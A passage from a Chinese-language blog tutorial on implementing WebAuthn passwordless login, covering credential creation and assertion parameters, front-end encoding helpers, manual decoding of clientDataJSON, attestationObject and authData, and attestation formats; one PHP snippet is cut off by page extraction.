ID</li>\n<li>\n<code>rawId: ArrayBuffer</code>：<code>ArrayBuffer</code> 的原始凭证 ID</li>\n<li>\n<code>type: String</code>：一定是 “public-key”</li>\n<li>\n<code>response: Object</code>：对于验证流程，认证会返回 <code>AuthenticatorAssertionResponse</code> 而不是 <code>AuthenticatorAttestationResponse</code> 对象，这个对象包含以下 4 个属性：\n<ul>\n<li>\n<code>response.authenticatorData: ArrayBuffer</code>：认证器信息，包含认证状态、签名计数等</li>\n<li>\n<code>response.signature: ArrayBuffer</code>：被认证器签名的 <code>authenticatorData</code> + <code>clientDataHash</code>（<code>clientDataJSON</code> 的 SHA-256 hash）</li>\n<li>\n<code>response.userHandle: ArrayBuffer</code>：<code>create()</code> 创建凭证时的用户 ID <code>user.id</code>。许多 U2F 设备不支持这一特性，这一项将会是 <code>null</code>\n</li>\n<li>\n<code>response.clientDataJSON: ArrayBuffer</code>：客户端数据，包含 origin（即凭证请求来源）、挑战等信息</li>\n</ul>\n</li>\n</ul>\n<p>同样地，我们将 <code>ArrayBuffer</code> 们以合适的方式编码成字符串后就可以把 <code>PublicKeyCredential</code> 发送给依赖方以供验证了。至于具体怎么做，别急，马上就来讲一讲。</p>\n<h2>简单实现</h2>\n<p>了这么多，我们终于可以实现一个简单的 WebAuthn 认证页面了。由于在实际操作中 WebAuthn 相关的数据解码和密码计算比较复杂，在服务器端我们可以使用第三方库来帮我们做这些脏活累活，我们只需专注于具体流程就可以了。</p>\n<p>要寻找可用的第三方库，你可以在 <a href=\"https://webauthn.io/\">webauthn.io</a> 上找到适用于各种语言的第三方库——除了 PHP（笑）。不过好在你可以在 GitHub 上找到几个不错的 PHP WebAuthn 库，比如 <a href=\"https://github.com/web-auth/webauthn-framework\">web-auth/webauthn-framework</a>。</p>\n<p>在我们的这个例子中，我们关心的主要是前端逻辑；而后端我们可以使用各类几乎已经做到开箱即用的第三方库，这样我们可以专注于流程而不必关心细节。当然如果你想了解后端的解码细节，可以阅读“<a href=\"https://flyhigher.top/#webauthn-decode\">手动解个码</a>”一节。</p>\n<hr>\n<p>让我们先从注册开始吧。现在，用户点击了注册认证器的按钮，一个请求被发送给服务器（也就是依赖方）。在最简单的情况中，依赖方需要将三个内容发送给浏览器：<strong>挑战、用户信息和用户已注册的凭证 ID 列表（即 <code>excludeCredentials</code>）</strong>。当然依赖方也可以自由选择发送更多信息，只要最终前端能构建合法的参数即可。</p>\n<p>挑战最终会被转换为 <code>Uint8Array</code>，即一组 0-255 的整数。如果使用 PHP，在后端我们可以这样生成 Base64 编码的挑战：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"php\">$challenge = \"\";\r\nfor($i = 0; $i \n<p>对于用户信息，我们需要登录名、显示名称和 ID 三项内容。我们可以从数据库中取出用户信息，也可以新建一份。需要注意的是，<strong>出于安全和隐私的考量，ID 不应该包含用户的任何信息，比如用户邮箱等。</strong>推荐的做法是和挑战一样，生成一个随机字符串/一组随机数，并将其于用户关联起来以供之后使用。</p>\n<p>发送已注册的凭证 ID 列表是为了防止用户重复注册同一个认证器。正确设置该列表后，如果用户试图注册同一个认证器，浏览器会中止流程并抛出 <code>InvalidStateError</code>。</p>\n<p>最后，别忘了将挑战等一些后续可能会用到的信息临时存储起来。Session 就是一个很好的选择。</p>\n<p>将所有信息发送到浏览器之后，我们应该可以构建出新建凭证所需的参数了。由于有多个参数需要以 <code>Uint8Array</code> 的形式传入，我们可以准备一个简单的工具函数帮我们将 Base64 的字符串转为 <code>Uint8Array</code>。</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">function str2ab(str){\r\n    return Uint8Array.from(window.atob(str), c=&gt;c.charCodeAt(0));\r\n}</pre>\n<p>除了 <code>challenge</code>, <code>rp</code>, <code>user</code> 和 <code>excludeCredentials</code> 几部分需要你根据具体情况设置外，上文提到的其他参数一般可以这么设置：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">publicKey: {\r\n    challenge, // 自行设置\r\n    rp, // 自行设置\r\n    user, // 自行设置\r\n    pubKeyCredParams: [\r\n        {\r\n            type: \"public-key\",\r\n            alg: -7 // ES256\r\n        },\r\n        {\r\n            type: \"public-key\",\r\n            alg: -257 // RS256\r\n        }\r\n    ],\r\n    authenticatorSelection: {\r\n        userVerification: \"discouraged\",\r\n        authenticatorAttachment: null // 除非用户指定，大部分情况下无需指定\r\n    },\r\n    excludeCredentials, // 自行设置\r\n    timeout: 60000\r\n}</pre>\n<p>然后就是传入 <code>navigator.credentials.create()</code>，拿到 <code>PublicKeyCredential</code>。如果一切顺利，接下来我们就需要考虑如何将返回的内容传回依赖方了。由于我们拿到的很多都是 <code>ArrayBuffer</code>，我们需要将其进行编码。再准备一个工具函数吧：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">function array2b64String(a) {\r\n    return window.btoa(String.fromCharCode(...a));\r\n}</pre>\n<p>然后适当处理，我们就可以得到一个方便传输的 JSON 字符串了：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">navigator.credentials.create({publicKey}).then((credentialInfo) =&gt; {\r\n    const publicKeyCredential = {\r\n        id: credentialInfo.id,\r\n        type: credentialInfo.type,\r\n        rawId: array2b64String(new Uint8Array(credentialInfo.rawId)),\r\n        response: {\r\n            clientDataJSON: array2b64String(new Uint8Array(credentialInfo.response.clientDataJSON)),\r\n            attestationObject: array2b64String(new Uint8Array(credentialInfo.response.attestationObject))\r\n        }\r\n    };\r\n    return publicKeyCredential;\r\n}).then(JSON.stringify).then((authenticatorResponseJSON) =&gt; {\r\n    // 可以发送了\r\n}).catch((error) =&gt; {\r\n    console.warn(error); // 捕获错误\r\n})</pre>\n<p>依赖方收到数据以后，还需要做三件事：验证挑战、存储凭证 ID 和存储公钥。如果数据解码顺利，且收到的挑战和之前发送的一致，就可以认为注册成功，将凭证 ID 及公钥与用户关联起来。这一步有很多第三方库可以帮我们做，对于基础实现我们就不深入探究了。</p>\n<blockquote><p>由于不同厂商的认证器的实现方式不同，<strong>我们并不能保证凭证 ID 一定是全局唯一的</strong>，也就是说，凭证 ID 有可能碰撞——即使这些凭证实际上是不同的。依赖方在实现凭证 ID 的存储及查找时，需要注意和用户 ID 结合进行存储或查找，或是直接在注册认证器时在服务器端对比阻止相同的凭证 ID。</p></blockquote>\n<hr><p>接下来就可以进行验证了。某天，用户点击了验证按钮准备登录，于是浏览器发送了验证请求到依赖方，同时附上要登录的用户名。接下来依赖方至少需要发送两项内容给浏览器：<strong>挑战和用户已绑定的凭证 ID 列表（即 <code>allowCredentials</code>）。</strong></p>\n<p>之后前端的处理流程就和注册时基本一致了。只是需要注意验证流程中获取到的 <code>PublicKeyCredential</code> 的结构和注册时的稍有不同。</p>\n<p>当浏览器将数据传回后，依赖方需要做的事情就比之前要麻烦一些了。依赖方需要验证挑战，并用之前存储的公钥验证签名和签名计数。同样地，这一步有很多第三方库可以帮我们做。最后，如果验证全部通过，我们就可以允许用户登录了。</p>\n<p>到目前为止，我们已经实现了一个简单的 WebAuthn 验证服务。不过这只是一个最基础的实现，对于很多高安全要求的身份认证这是远远不够的。因此，我们需要摆脱对第三方库的依赖，深入了解 WebAuthn。你可以继续阅读“<a href=\"https://flyhigher.top/#deep-into-webauthn\">深入了解 WebAuthn</a>”部分，不过对于基础的 WebAuthn 实现，我们的旅程就到这里了。</p>\n<h2>拓展阅读</h2>\n<p>如果你的目标只是快速了解如何开发 WebAuthn，那么你阅读到这里就可以了。同时，上一节例子中的部分代码来自于我为了这篇文章开发的 WordPress 插件 WP-WebAuthn，这个插件可以为你的 WordPress 启用 WebAuthn 无密码登录（并非二步验证），你可以查阅插件的 <a href=\"https://github.com/yrccondor/wp-webauthn\">GitHub 存储库</a>了解更多，也可以自己安装试一试。</p>\n<p>如果你正在使用 Chrome 开发，Chrome 87+ 版本添加了一个 WebAuthn 开发者面板，可以帮助你在没有任何实体验证器的情况下开发 WebAuthn 功能。你可以在 Google 的<a href=\"https://developers.google.com/web/tools/chrome-devtools/webauthn\">这篇文章</a>中了解更多。不够，如果你正在使用 Firefox，很遗憾目前我还没有找到对应的开发工具或是浏览器扩展可用。</p>\n<p>如果你希望了解更多关于非对称加密的数学证明，可以查阅阮一峰老师的<a href=\"http://www.ruanyifeng.com/blog/2013/06/rsa_algorithm_part_one.html\">这篇文章</a>。</p>\n<p>如果你希望了解更多关于 Credential Management API 的信息，可以查阅<a href=\"https://medium.com/dev-channel/sign-in-on-the-web-credential-management-api-and-best-practices-d21aed14b6fe\">这篇文章</a>（英文）。</p>\n<p>如果你希望了解更多 WebAuthn 的细节，可以继续往下阅读。<span></span></p>\n<h1>深入了解 WebAuthn</h1>\n<p>如上文所说，如果摆脱对第三方库的依赖，或是要实现更安全的 WebAuthn，我们必须深入了解 WebAuthn。在这一部分中，我们会详细讨论上文没有提到的一些概念和参数，并了解 WebAuthn 中各类数据的结构以实现解码与验证。先来看一看一些进阶的选项吧。</p>\n<h2>进阶选项</h2>\n<p>没错，上文提到的传入 <code>navigator.credentials.create()</code> 和 <code>navigator.credentials.get()</code> 方法的参数其实只是所有参数的一部分。对于 <code>create()</code>，我们还可以配置这些可选内容（上文提及的已省略）：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">navigator.credentials.create({\r\n    publicKey: {\r\n        rp: {\r\n            icon\r\n        },\r\n        user: {\r\n            icon\r\n        },\r\n        attestation,\r\n        authenticatorSelection: {\r\n            requireResidentKey\r\n        },\r\n        extensions\r\n    }\r\n})</pre>\n</pre>\n<ul>\n<li>\n<code>rp.icon: String</code> 和 <code>user.icon</code>：是的，你可以为依赖方和用户设置图标，可以使用 HTTPS URL 或 Base64，一般长度不能超过 128 字节，不过大部分浏览器不会显示图标，或是有非常小的图片体积限制，所以一般没有使用这一属性的必要</li>\n<li>\n<code>attestation: String</code>：表明依赖方是否需要证明。可选三个值：\n<ul>\n<li>\n<code>none</code>：（默认）不需要证明。如上文所述，依赖方不关心证明，因此认证器不会签名。对于 iOS/iPad OS 13，必须设置为此值，否则验证将失败</li>\n<li>\n<code>indirect</code>：依赖方需要证明，但证明方式可由认证器选择。在支持匿名证明的认证器上，认证器会通过匿名证明的方式签名挑战，并向依赖方提供签名方式等信息</li>\n<li>\n<code>direct</code>：依赖方要求直接证明。此时认证器会使用烧录在认证器中的公钥进行签名，同时向依赖方提供签名方式等信息以供依赖方验证认证器是否可信。更多信息可以阅读“<a href=\"https://flyhigher.top/#verify-authenticator\">验证认证器</a>”一节</li>\n</ul>\n</li>\n<li>在 <code>authenticatorSelection</code> 中，我们还可以设置两个可选属性：\n<ul>\n<li>\n<code>authenticatorSelection.requireResidentKey: Boolean</code>：是否要求将私钥钥永久存储于认证器中。默认值为 <code>false</code>。对于 iOS/iPad OS 13，必须设置为 <code>false</code>，否则验证将失败</li>\n</ul>\n</li>\n</ul>\n<li>\n<code>extensions: Object</code>：WebAuthn 扩展，可以提供规范之外的配置和响应。由于实际情况中很少会使用这一特性，我们不会在这篇文章中讨论它</li>\n\n<blockquote><p>将 <code>requireResidentKey</code> 设置为 <code>true</code> 可以实现无用户名的登录，即认证器同时替代了用户名和密码。需要注意的是，尽管大部分认证器可以实现无限对公私钥，<strong>但能永久存储的私钥数量是有限的</strong>（对于 Yubikey，这通常是 25），因此只应在真正需要的时候启用此特性。我们会在“<a href=\"https://flyhigher.top/#login-without-username\">无用户名登录</a>”一节中详细讨论原因。</p></blockquote>\n<blockquote><p><strong>如果你没有高安全需求（如银行交易等），请不要向认证器索取证明</strong>，即将 <code>attestation</code> 设置为 \"none\"。对于普通身份认证来说，要求证明不必要的，且会有浏览器提示打扰到用户。</p></blockquote>\n<blockquote><p>Android 暂时无法实施用户验证，进而会导致依赖方验证失败。你可以在<a href=\"https://bugs.chromium.org/p/chromium/issues/detail?id=997538\">这里</a>追踪这个特性的实现情况。</p></blockquote>\n<blockquote>\n<p>对于 <code>extensions</code>，由于目前浏览器支持和应用范围有限，我们不会在这篇文章中涉及，不过你可以看一个例子：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">extensions: {\r\n    uvm: true, // 要求认证器返回用户进行验证的方法\r\n    txAuthSimple: \"Please proceed\" // 在认证器上显示与交易有关的简短消息\r\n}</pre>\n<p>你可以在<a href=\"https://www.w3.org/2019/01/webauthn-extensions.html\">这个页面</a>了解更多关于 <code>extensions</code> 的信息。</p>\n</blockquote>\n<p>对于 <code>get()</code>，我们其实只有一个可选内容没讲了，即 <code>extensions</code>。和上文一样，我们不会在这篇文章中讨论它。</p>\n<p>就这些了！<span></span></p>\n<h2>手动解个码</h2>\n<p>是时候看看如何手动解码了。我们将会在这一节中讨论认证器返回的数据的结构以及如何正确地解码它们。</p>\n<p>首先我们来看看如何处理注册过程中认证器发回的数据。假设所有 <code>ArrayBuffer</code> 类型的值都被正确地以 Base64 编码，且后端已经将 JSON 的字符串解析为字典。先来复习一下，我们得到的数据应该是这样的（数据较长，已省略一部分）：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">{\r\n    id: \"ZRBkDBCEtq...9XY8atOcbg\",\r\n    type: \"public-key\",\r\n    rawId: \"ZRBkDBCEtq...9XY8atOcbg==\",\r\n    response: {\r\n        clientDataJSON: \"eyJjaGFsbGVuZ2U...i5jcmVhdGUifQ==\",\r\n        attestationObject: \"o2NmbXRkbm9uZWd...xNHuAMzz2LxZA==\"\r\n    }\r\n}</pre>\n<p>这里的 <code>id</code> 就是凭证的 ID，如果验证正确，我们最终要将它存储起来并于用户关联。同时可以看到 Base64 编码后的 <code>rawId</code> 其实和 <code>id</code> 是一致的（不过 <code>id</code> 是 Base64URL 编码的）。而 <code>type</code> 则一定是 \"public-key\"。</p>\n<p>不过，我们主要关心的还是 <code>respose</code> 中的两项内容。首先是 <code>clientDataJSON</code>。它的处理比较简单，看名字就知道，它应该是一个 JSON 字符串。</p>\n<blockquote><p>小技巧：如果你看到一个 Base64 编码的字符串以 \"ey\" 开头，那么它大概率是一个 Base64 编码的 JSON。</p></blockquote>\n<p>将<code>clientDataJSON</code> Base64 解码再 JSON 解码之后我们就能得到一个字典：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">{\r\n    challenge: \"NI4i1vsNmP2KHcmyFnBCKRVQPfHgg34SsYZUOPZY2lM\",\r\n    extra_keys_may_be_added_here: \"do not compare clientDataJSON against a template. See https://goo.gl/yabPex\",\r\n    origin: \"https://dev.axton.cc\",\r\n    type: \"webauthn.create\"\r\n}</pre>\n<p>结构一目了然。在这里，我们需要验证三项内容：</p>\n<ul>\n<li>\n<code>challenge</code> 和之前发送的一致</li>\n<li>\n<code>origin</code> 为创建凭证的页面的源（协议+主机名+端口号，并非 URL）</li>\n<li>\n<code>type</code> 为 \"webauthn.create\"</li>\n</ul>\n<p>同时可以注意到有一个奇怪的 <code>extra_keys_may_be_added_here</code>。这其实是 Google 在 Chrome 中搞的一点小把戏，有一定概率会出现，提醒我们需要将 JSON 解析后再验证键值以防额外插入的键值影响验证。具体信息你可以访问那个 URL 看一看。</p>\n<p>对于 Firefox，我们会多得到两项 <code>clientExtensions</code> 和 <code>hashAlgorithm</code> ，分别指明了客户端扩展数据和签名算法。</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\" data-enlighter-highlight=\"3-4\">{\r\n    challenge: \"dg6ost6ujhAA0g6WqLe-SOOH-tbhvjW9Sp90aPKlLJI\",\r\n    clientExtensions: {},\r\n    hashAlgorithm: \"SHA-256\",\r\n    origin: \"https://dev.axton.cc\",\r\n    type: \"webauthn.create\"\r\n}</pre>\n<p>由于本文不考虑扩展数据，因此我们可以不考虑 <code>clientExtensions</code>。同时由于目前规范中指定的签名算法只有 SHA-256 一种，因此现阶段我们也可以简单地忽略 <code>hashAlgorithm</code>。</p>\n<p><code>clientDataJSON</code> 很简单地就处理完了。接下来我们要来看看 <code>attestationObject</code>。先来看看 <code>attestationObject</code> 的结构图示：</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/s1-3.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/s1-3.png\" alt=\"attestationObject 的结构\" width=\"1056\" height=\"532\" class=\"aligncenter size-full wp-image-2245\"></a>\n<p><code>attestationObject</code> 是 CBOR 编码后再被 Base64 编码的，因此我们需要额外对其进行 CBOR 解码。</p>\n<blockquote><p>CBOR (Concise Binary Object Representation, 简明二进制对象表示) 是一种多应用于物联网领域的编码方式，你可以将它看作体积更小、更方便物联网传输的二进制 JSON。大部分语言都可以找到对应的 CBOR 解码库。</p></blockquote>\n<p>我们当然不会手解 CBOR，直接来看看解开之后的样子吧：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">{\r\n    fmt: \"none\",\r\n    attStmt: {},\r\n    authData: [211, 217, 43, 24, 199, ..., 97, 238, 166, 67, 107]\r\n}</pre>\n<p>这些键值的含义如下：</p>\n<ul>\n<li>\n<code>fmt</code>：标明证明的格式。WebAuthn 预定义了几种格式，分别为：\n<ul>\n<li>\n<code>none</code>：没有证明</li>\n<li>\n<code>packed</code>：为 WebAuthn 优化的证明格式</li>\n<li>\n<code>android-safetynet</code>：Android 使用的格式</li>\n<li>\n<code>android-key</code>：又是 Android 使用的格式</li>\n<li>\n<code>fido-u2f</code>：FIDO U2F 认证器使用的格式</li>\n<li>\n<code>tpm</code>：TPM 可信平台模块使用的格式</li>\n</ul>\n</li>\n<li>\n<code>attStmt</code>：证明对象，具体格式根据 <code>fmt</code> 的不同会有所不同</li>\n<li>\n<code>authData</code>：包含公钥、签名计数等来自认证器的数据</li>\n</ul>\n<p>诶，例子里的 <code>attStmt</code> 怎么是空的？还记得之前说的吗？大部分情况下，<strong>如果依赖方不要求证明，那么认证器不会签名挑战</strong>，于是 <code>fmt</code> 会变为 \"none\"，<code>attstmt</code> 会为空。如果不是高安全要求，我们可以只对这一种情况做支持。</p>\n<blockquote><p>注意，部分情况下 Firefox 会在不要求证明（即 <code>attestation</code> 为 \"none\"）时会返回 <code>fmt</code> 为 \"packed\" 的证明。<strong>这是符合规范的。</strong>此时认证器会进行自证明，你可以视情况进行处理。具体可以阅读“<a href=\"https://flyhigher.top/#verify-authenticator\">验证认证器</a>”一节。</p></blockquote>\n<p>对于非 \"none\" 的 <code>fmt</code> 我们稍后再谈，现在我们先来看看 <code>authData</code>。来复习一下 <code>authData</code> 的结构：</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/s2-3.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/s2-3.png\" alt=\"authData 的结构\" width=\"1056\" height=\"384\" class=\"aligncenter size-full wp-image-2240\"></a>\n<p>对于它的解码比较简单粗暴，我们要做的就是根据图示将它切开，然后适当地转换类型。其中各部分的含义如下：</p>\n<ul>\n<li>\n<code>rpIdHash</code>：如其名，SHA-256 的 <code>rpId</code>，长度 32 字节</li>\n<li>\n<code>flags</code>：标识认证状态，长度 1 字节。其中 8 位分别为：\n<ul>\n<li>\n<code>ED</code>：是否有扩展数据</li>\n<li>\n<code>AT</code>：是否包含 <code>attestedCredentialData</code>。通常注册认证器时会包含 <code>attestedCredentialData</code>，而验证时不包含</li>\n<li>保留位</li>\n<li>保留位</li>\n<li>保留位</li>\n<li>\n<code>UV</code>：用户是否已验证</li>\n<li>保留位</li>\n<li>\n<code>UP</code>：用户是否在场</li>\n</ul>\n</li>\n<li>\n<code>signCount</code>：签名计数，长度 4 字节</li>\n<li>\n<code>attestedCredentialData</code>：包含公钥等凭据数据，变长。其结构如下：\n<ul>\n<li>\n<code>aaguid</code>：认证器的 AAGUID (Authenticator Attestation GUID)，对于同一型号的认证器，它们的 AAGUID 是相同的</li>\n<li>\n<code>credentialIdLength</code>：标识 <code>credentialId</code> 的长度，长度 2 字节</li>\n<li>\n<code>credentialId</code>：凭证 ID，和 <code>rawId</code> 一致，长度由 <code>credentialIdLength</code> 定义</li>\n<li>\n<code>credentialPublicKey</code>：CBOR 编码的 COSE 格式的凭证公钥，变长</li>\n</ul>\n</li>\n<li>\n<code>extensions</code>：扩展数据，变长，本文不讨论</li>\n</ul>\n<blockquote><p>出于隐私考虑，如果不要求证明，认证器会以 0 填充 AAGUID。</p></blockquote>\n<p>如果你的后端在使用 Node.js，这里有个工具函数可以帮你完成这一步（不考虑 <code>extensions</code>）：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">function parseAuthData(buffer){\r\n    let rpIdHash = buffer.slice(0, 32);\r\n    buffer = buffer.slice(32);\r\n  \r\n    let flagsBuf = buffer.slice(0, 1);\r\n    buffer = buffer.slice(1);\r\n\r\n    let flagsInt = flagsBuf[0];\r\n    let flags = {\r\n        up: !!(flagsInt &amp; 0x01),\r\n        uv: !!(flagsInt &amp; 0x04),\r\n        at: !!(flagsInt &amp; 0x40),\r\n        ed: !!(flagsInt &amp; 0x80),\r\n        flagsInt\r\n    }\r\n\r\n    let counterBuf = buffer.slice(0, 4);\r\n    buffer = buffer.slice(4);\r\n  \r\n    let counter = counterBuf.readUInt32BE(0);\r\n\r\n    let aaguid = undefined;\r\n    let credID = undefined;\r\n    let COSEPublicKey = undefined;\r\n\r\n    if(flags.at) {\r\n        aaguid = buffer.slice(0, 16);\r\n        buffer = buffer.slice(16);\r\n\r\n        let credIDLenBuf = buffer.slice(0, 2);\r\n        buffer = buffer.slice(2);\r\n\r\n        let credIDLen = credIDLenBuf.readUInt16BE(0);\r\n        credID = buffer.slice(0, credIDLen);\r\n\r\n        buffer = buffer.slice(credIDLen);\r\n        COSEPublicKey = buffer;\r\n    }\r\n\r\n    return {rpIdHash, flagsBuf, flags, counter, counterBuf, aaguid, credID, COSEPublicKey}\r\n}</pre>\n<p>这段代码来自 <a href=\"https://gist.github.com/herrjemand/dbeb2c2b76362052e5268224660b6fbc\">herrjemand</a></p>\n<p>解开后，依赖方至少需要做四件事情：</p>\n<ol>\n<li>验证 <code>rpIdHash</code> 和预期的一致</li>\n<li>按预期检查用户在场和用户验证状态</li>\n<li>存储签名计数</li>\n<li>存储公钥</li>\n</ol>\n<blockquote><p>签名计数不一定从 0 开始。</p></blockquote>\n<p>对于公钥，也就是 <code>credentialPublicKey</code>，我们需要多一次 CBOR 解码，然后就可以得到类似这样的公钥：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">{\r\n    kty: \"EC\",\r\n    alg: \"ECDSA_w_SHA256\",\r\n    crv: \"P-256\",\r\n    x: \"ZGQALNfqo0L7HFYQHFHCS/X5db49z0ePnuQEs3w3X8w=\",\r\n    y: \"6qYxhnjYuez/Q8N6vX7nIIGfxFWdZ25NzQfZYuYOalA=\"\r\n}</pre>\n<p>然后可以选择适当的方法将其存储起来，之后的步骤本文就不再赘述了。现在，将目光拉回来，让我们看看包含证明的 <code>attestationObject</code> 是怎么样的。我们来看一个例子：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">{\r\n    fmt: \"packed\",\r\n    attStmt: {\r\n        alg: -7,\r\n        sig: [48, 70, 2, 33, 0, ..., 132, 78, 46, 100, 21],\r\n        x5c: [\r\n            [48, 130, 2, 189, 48, 130, 1, 165, 160, 3, ..., 177, 48, 125, 191, 145, 24, 225, 169, 41, 248]\r\n        ]\r\n    },\r\n    authData: [211, 217, 43, 24, 199, ..., 158, 54, 87, 126, 54]\r\n}</pre>\n<p>这里有一个使用 \"packed\" 格式的证明。此时，<code>attStmt</code> 中包含三个值：</p>\n<ul>\n<li>\n<code>alg</code>：签名算法</li>\n<li>\n<code>sig</code>：签名值</li>\n<li>\n<code>x5c</code>：X.509 编码的证书链</li>\n</ul>\n<p>我们不会在这一节中详述对签名的验证。要了解更多信息，你可以阅读“<a href=\"https://flyhigher.top/#verify-authenticator\">验证认证器</a>”一节。现在，让我们来看看如何处理验证过程中认证器发回的数据。我们得到的数据应该是这样的（数据较长，已省略一部分）：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">{\r\n    id: \"hmqdxPLit9...BWeVxZqdvU\",\r\n    type: \"public-key\",\r\n    rawId: \"hmqdxPLit9V...BWeVxZqdvU=\",\r\n    response: {\r\n        authenticatorData: \"09krGMcWTf...UFAAAABA==\",\r\n        clientDataJSON: \"eyJjaGFsbGVuZ2U...XRobi5nZXQifQ==\",\r\n        signature: \"UsXZV3pvT3np8btj6V0g...WBkaqyt88DrD40qh+A==\",\r\n        userHandle: \"MmYxNWYzZjQyZjM...Tg2ZDY4NzhlNw==\"\r\n    }\r\n}</pre>\n<p><code>id</code>, <code>rawId</code> 和 <code>type</code> 和之前一样，这里就不再赘述了。让我们来看看 <code>response</code>。首先是 <code>clientDataJSON</code>，和之前的解法一样，要验证的内容也一样，只是 <code>type</code> 从 \"webauthn.create\" 变成了 \"webauthn.get\"。</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">{\r\n    challenge: \"bnkd2CmrEuvKnAFXs2QlC3SKlg4XFvGtP4HJL1yEWyU\",\r\n    origin: \"https://dev.axton.cc\",\r\n    type: \"webauthn.get\"\r\n}</pre>\n<p>然后是 <code>userHandle</code>。前面讲过，这是认证器在创建凭证时的用户 ID。如果用户在使用 U2F 认证器，很可能这一项为空，所以大部分情况下我们不关心这一项。</p>\n<p>接着来看 <code>authenticatorData</code>。这其实就是之前的 <code>attestedCredentialData</code>，只是这次不包含公钥。以相同的方式切开数据，我们应该可以得到 <code>rpIdHash</code>, <code>flags</code>和 <code>signCount</code> 三项。此时，依赖方至少需要做这三样事情：</p>\n<ol>\n<li>验证 <code>rpIdHash</code> 和预期的一致</li>\n<li>按预期检查用户在场和用户验证状态</li>\n<li>验证签名计数大于之前存储的计数，并更新存储的计数</li>\n</ol>\n<blockquote><p>如果签名计数比之前的小，那么这个认证器很可能是伪造的，应该中止验证并返回验证失败。同时，签名计数不一定每次按 1 递增，通常只要计数比此前的大就认为计数检查通过。</p></blockquote>\n<p>最后，我们来看 <code>signature</code>，也就是签名。不过这个签名不是简单的对挑战的签名，具体算法如图所示：</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/s3-2.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/s3-2.png\" alt=\"签名过程\" width=\"1034\" height=\"587\" class=\"aligncenter size-full wp-image-2231\"></a>\n<p>计算签名时，认证器会将 <code>authenticatorData</code> 与 <code>clientDataHash</code>（也就是 <code>clientDataJSON</code> 的 SHA-256 Hash）拼接起来，并使用对应的私钥签名。依赖方应该使用对应的公钥将其解密，并验证内容是否是 <code>authenticatorData</code> 与 <code>clientDataHash</code> 的拼接。这部分的计算不在本文的讨论范围内。</p>\n<p>最后，如果全部验证通过，返回验证成功。<span></span></p>\n<h2>验证认证器</h2>\n<p>WebAuthn 已经很安全了，但有的时候我们还要让它更安全一点。比如，如果用户在使用伪造的或是自制的认证器，认证器的安全性就得不到保证。此时，依赖方就需要验证认证器是否是可信的认证器。</p>\n<blockquote><p>这一过程仅发生在注册认证器时。此时，如果认证器验证通过，就可以存储公钥，后续步骤和之前描述的一致。</p></blockquote>\n<blockquote><p>再次说明，如果不是对安全性有极高的要求，向认证器索取证明以验证认证器是否可信是没有必要的。此外，验证认证器需要依赖方自行维护可信认证器列表，大大增加了维护的复杂性。</p></blockquote>\n<p>在调用 <code>navigator.credentials.create()</code> 时，我们可以将 <code>attestation</code> 设置为非 \"none\" 来向认证器索取证明。除无证明外，WebAuthn 定义了四种证明方式：</p>\n<ul>\n<li>Basic Attestation (Basic) ：基础的证明方式，认证器会使用认证器私钥签名</li>\n<li>Self Attestation (Self) ：自证明，认证器会使用凭证私钥签名</li>\n<li>Attestation CA (AttCA) ：认证器会使用多个证明私钥之一签名</li>\n<li>Elliptic Curve based Direct Anonymous Attestation (ECDAA) ：通过 <a href=\"https://en.wikipedia.org/wiki/Direct_Anonymous_Attestation\">DAA</a> 实现的匿名证明</li>\n</ul>\n<blockquote><p>和验证过程一样，这里签名的目标是 <code>authenticatorData</code> 和 <code>clientDataHash</code> 的连接。</p></blockquote>\n<p>还记得 <code>create()</code> 时 <code>attestation</code> 可选的三个值吗？这个值会决定认证器最终使用哪种方式进行证明。复习一下：</p>\n<ul>\n<li>\n<code>none</code>：大部分情况下认证器会选择不进行证明，部分认证器会进行自证明。此时 AAGUID 会被 0 填充</li>\n<li>\n<code>indirect</code>：认证器会试图通过替换 AAGUID 和选择合适的证明方式来进行匿名证明，具体方式由认证器选择</li>\n<li>\n<code>direct</code>：认证器会提供最直接的证明信息</li>\n</ul>\n<p>注意，大部分情况下，当认证器需要向依赖方证明自己可信时需要提供认证器公钥，<strong>这会触发浏览器提示，只有用户同意后认证器才会进行证明，否则认证器将不提供证明。</strong></p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/5.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/5.png\" alt=\"浏览器提示\" width=\"446\" height=\"283\" class=\"aligncenter size-full wp-image-2217\"></a>\n<blockquote><p>为什么浏览器会说“安全密钥的品牌和型号”？事实上，为了避免用户通过认证器证书被跨依赖方追踪，FIDO 要求使用相同认证器证书的认证器的数量不能少于 100,000。于是大部分认证器厂商会选择<strong>让同一型号的认证器共用同一份证书。</strong>因此，浏览器的会询问用户是否同意“查看安全密钥的品牌和型号”。</p></blockquote>\n<blockquote><p>Android Safety Net 不会向用户询问是否同意，而是会静默进行证明。</p></blockquote>\n<p>当证明不为空时，依赖方收到数据后根据 <code>attestationObject.fmt</code> 